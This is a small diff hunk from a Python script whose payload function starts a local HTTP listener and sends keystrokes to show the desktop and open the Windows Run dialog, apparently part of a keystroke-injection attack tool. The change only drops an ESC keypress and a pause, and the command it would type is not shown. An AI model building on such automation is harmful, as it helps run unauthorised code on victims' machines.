@@ -76,8 +76,6 @@ def payload(web_dir):
 	httplistener=Process(target=httpd.handle_request)
 	httplistener.start()
 	os.chdir("..")
-	eco.press("ESC")
-	sleep(0.5)
 	eco.press("WIN+d")
 	sleep(1)
 	eco.press("LGUI+r")
